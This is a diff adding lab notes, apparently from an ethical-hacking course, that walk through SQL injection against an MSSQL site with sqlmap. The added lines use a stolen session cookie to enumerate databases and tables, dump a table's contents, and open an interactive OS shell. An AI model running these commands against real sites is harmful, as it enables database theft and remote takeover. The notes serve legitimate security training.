@@ -82,7 +82,23 @@ the sent buffer size and -t refers to pinging the specific host.
 ------------------------------------------------END--------------------------------------
 
 --------------------------------------Perform an SQL IA for MSSQL & Extract Databases using sqlmap--------------
+>In the Parrot Terminal window, type
+> sqlmap -u "http://www.<site>.com/viewprofile.aspx?id=1" --cookie="[cookie value that you copied in Step 8]" --dbs
+[finds the DB]
+In this query, -u specifies the target URL (the one you noted down in Step 6), --cookie specifies the HTTP cookie header value, 
+and --dbs enumerates DBMS databases.
+>if any  message appears, type Y and press Enter to continue.
 
+> sqlmap -u "http://www.<site>.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step 8]" -D <db name> --tables
+[finds the tables of the DB, dont use the <> while mentioning db name]
+In this query, -D specifies the DBMS database to enumerate and --tables enumerates DBMS database tables.
 
+> sqlmap -u "http://www.<site>.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step 8]" -D <db name> -T <table name> --dump
+[dump all the content for <table name>]
+
+> sqlmap -u "http://www.<site>.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step 8]" --os-shell
+[ --os-shell is the prompt for an interactive OS shell]
+>hostname
+>TASKLIST
 ------------------------------END-----------------------------
 
